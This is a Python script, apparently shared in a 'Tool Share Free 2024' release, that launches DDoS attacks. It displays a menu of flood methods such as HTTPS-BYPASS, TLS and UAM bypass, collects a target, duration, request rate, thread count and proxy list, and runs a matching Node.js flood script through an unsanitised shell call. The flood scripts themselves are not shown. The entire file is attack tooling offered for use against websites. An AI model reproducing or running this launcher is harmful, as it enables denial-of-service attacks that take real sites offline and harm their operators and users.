import subprocess
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
⠀⠀⠀⣠⣴⣶⣶⣾⡿⠿⠿⠿⠷⠦⠤⠀⠀⠀⠀⠠⠶⠿⠿⠿⠿⢿⣷⣶⣶⣦⡄⠀⠀⠀
⠀⣠⣾⡿⠛⣁⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡈⠹⣿⣧⡄⠀
⣰⣿⡿⢆⣾⡟⠃⣠⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣦⡄⠘⢻⣇⡸⢿⣷⡆
⣷⣿⡇⣾⣿⡁⣾⣿⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡇⢸⣿⡇⢸⣿⣿
⠘⣿⣿⣿⣷⣾⣿⡏⠁⠠⣶⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡦⠄⠈⢹⣿⣷⣾⣿⣿⡟⠃
⣾⣵⣿⣿⣿⣿⣿⣷⣶⣶⣷⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣶⣾⣿⣿⣿⣿⣿⣿⣧
⠈⠛⢿⣷⡎⠉⠛⠻⠿⢿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⡿⠿⠟⠛⠉⢱⣾⡟⠛⠁      @Tool Share Free 2024
⠀⠀⠀⢹⡿⠁⠀⠀⠀⠈⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⣸⣿⣿⡯⠁⠀  ⠀⠀⠸⢿⡇⠀⠀⠀ NEW DDOS 
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠘⣿⣿⣧⡄⢀⣀⣀⡀⣠⣽⣿⡟⠃⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⠏⠘⠋⢠⡄⠘⠋⠹⢿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀METHODS DDOS SHARE FREE
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⢸⢁⡀⠀⠐⠃⡆⠀⠀⠀⠀⠀⠀⠀1⠀FLOOD
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⡆⠀⠀⢸⡀⠀⠐⢴⣷⡆⠀⠀⠀⠀⠀⠀⠀2⠀FLOOD2
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢏⣿⡇⠀⠀⠀⠀⢸⣿⡏⠁⠀⠀⠀⠀⠀⠀⠀3⠀HTTPS-BYPASS⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠐⠒⠀⠐⠐⠂⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀4⠀TLS
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡅⠀⠀⠀⠀⣜⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀5⠀TLSV2
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡝⠂⠘⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀6⠀UAM
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⡠⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀8⠀HTTP-TIGER
 '''




banner = r"""
""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def execute_command(method,target, time, request, thread, proxy_file):
    command = f'node {method}.js {target} {time} {request} {thread} {proxy_file}'
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
def main():
    target = input("\033[1;36m \033[3m Tar Get : \033[1;37m ")
    method = input("\033[1;36m \033[3m Methods : \033[1;37m ")
    time = input("\033[1;36m \033[3m Ducation : \033[1;37m ")
    request = input("\033[1;36m \033[3m Requests : \033[1;37m ")
    thread = input("\033[1;36m \033[3m Thead : \033[1;37m ")
    proxy_file = input("\033[1;36m \033[3m Proxy : \033[1;37m ")
    print("\033[1;93m⊂🚀⊃ ATTACK SENT ALL WEB SITE ⊂🚀⊃")
    execute_command(method,target, time, request, thread, proxy_file)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()
